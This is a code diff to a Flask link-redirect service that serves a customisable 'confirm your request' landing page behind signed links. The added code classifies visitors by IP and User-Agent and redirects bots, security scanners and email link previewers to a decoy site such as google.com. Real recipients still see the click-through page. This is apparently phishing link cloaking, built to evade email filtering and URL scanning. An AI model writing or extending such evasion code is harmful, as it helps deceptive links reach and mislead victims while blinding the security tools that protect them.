@@ -27,6 +27,9 @@ LOG_WEBHOOK_URL = os.environ.get("LOG_WEBHOOK_URL", "")
 KV_URL = os.environ.get("KV_REST_API_URL", "")
 KV_TOKEN = os.environ.get("KV_REST_API_TOKEN", "")
 
+# Default URL to send unwanted traffic (bots, scanners, email filters) to
+UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")
+
 app = Flask(__name__)
 app.secret_key = SK.encode()
 serializer = URLSafeTimedSerializer(app.secret_key, salt="link-gate")
@@ -191,12 +194,19 @@ async def landing(token: str):
     except BadSignature:
         return _static_page("Invalid link", "This link is not valid.", 404)
 
+    # Classify traffic source
+    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
+    await emit_log({"event": "landing_get", **tag, "token": token[:12]})
+
+    # If traffic is identified as a bot, scanner, or email link previewer, 
+    # redirect them to the configured unwanted URL.
+    if tag["scanner"]:
+        unwanted_url = data.get("unwanted_target", UNWANTED_REDIRECT_URL)
+        return redirect(unwanted_url, code=302)
+
     nonce = secrets.token_urlsafe(16)
     payload = {"t": token, "n": nonce, "ts": time.time()}
     cookie_val = cookie_serializer.dumps(payload)
-
-    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
-    await emit_log({"event": "landing_get", **tag, "token": token[:12]})
 
     html = render_template_string(
         LANDING,
@@ -298,8 +308,15 @@ def mint():
     target = body.get("target")
     if not isinstance(target, str) or not target.startswith(("http://", "https://")):
         return jsonify({"error": "target required"}), 400
+    
+    # Optional per-link unwanted redirect URL override
+    unwanted_target = body.get("unwanted_target")
+    if unwanted_target and not isinstance(unwanted_target, str):
+        return jsonify({"error": "unwanted_target must be a string"}), 400
+
     tok = serializer.dumps({
         "target": target,
+        "unwanted_target": unwanted_target,
         "title": body.get("title", "Confirm your request"),
         "body": body.get("body", "Click the button below to continue."),
         "cta": body.get("cta", "Click here to confirm"),
